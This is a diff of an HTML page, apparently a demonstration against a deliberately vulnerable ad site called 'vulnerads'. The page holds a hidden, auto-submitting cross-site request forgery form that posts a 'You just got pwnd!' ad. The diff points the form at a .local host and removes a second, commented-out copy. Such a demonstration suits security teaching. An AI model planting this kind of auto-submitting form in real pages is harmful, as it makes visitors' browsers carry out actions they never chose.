@@ -29,21 +29,12 @@
   </div>
 </div>
 <iframe style="display:none" name="csrf-frame-1"></iframe>
-<form method='POST' action='http://vulnerads.de/ad/create' target="csrf-frame-1" id="csrf-form-1">
+<form method='POST' action='https://vulnerads.local/ad/create' target="csrf-frame-1" id="csrf-form-1">
     <input type='hidden' name='title' value='You just got pwnd!'>
     <input type='hidden' name='price' value='1337'>
     <input type='hidden' name='description' value='Use CSRF tokens next time...'>
     <input style='display: none' type='submit' value='submit'>
 </form>
 <script>document.getElementById("csrf-form-1").submit()</script>
-<!--<iframe style="display:none" name="csrf-frame-2"></iframe>
-<form method='POST' action='https://vulnerads.de/ad/create' target="csrf-frame-2" id="csrf-form-2">
-    <input type='hidden' name='title' value='You just got pwnd!'>
-    <input type='hidden' name='price' value='1337'>
-    <input type='hidden' name='adphoto' value=''>
-    <input type='hidden' name='description' value='Use CSRF tokens next time...'>
-    <input style='display: none' type='submit' value='submit'>
-</form>
-<script>document.getElementById("csrf-form-2").submit()</script>-->
 </body>
 </html>
